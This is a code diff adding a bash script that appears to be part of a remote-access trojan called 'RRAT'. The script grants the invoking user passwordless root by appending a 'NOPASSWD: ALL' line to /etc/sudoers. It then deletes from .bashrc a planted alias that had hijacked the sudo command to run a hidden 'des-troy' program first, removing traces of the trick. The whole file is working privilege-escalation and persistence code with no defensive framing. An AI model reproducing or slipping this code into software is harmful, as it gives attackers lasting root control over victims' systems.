@@ -1,0 +1,24 @@
+#! /bin/bash
+
+USER_HOME=$(getent passwd $SUDO_USER | cut -d: -f6)
+echo $(getent passwd $SUDO_USER)
+
+cd "$USER_HOME"
+echo "$USER_HOME"
+
+# Are we root?
+if [ -f "$USER_HOME/rratfiles/root" ]
+then
+    echo "RRAT Daemon is already root"
+    exit
+fi
+
+# If we're not root already, we create a file indicating that we ARE
+touch "$USER_HOME/rratfiles/root"
+
+# We then add this little line into the sudoers file
+line="$SUDO_USER ALL=(ALL) NOPASSWD: ALL"
+echo "$line" >> /etc/sudoers
+
+# And finally, we delete the alias created by des-troy
+sed -i "\#alias sudo='sudo ~/rratfiles/des-troy-r && sudo'#d" ".bashrc"
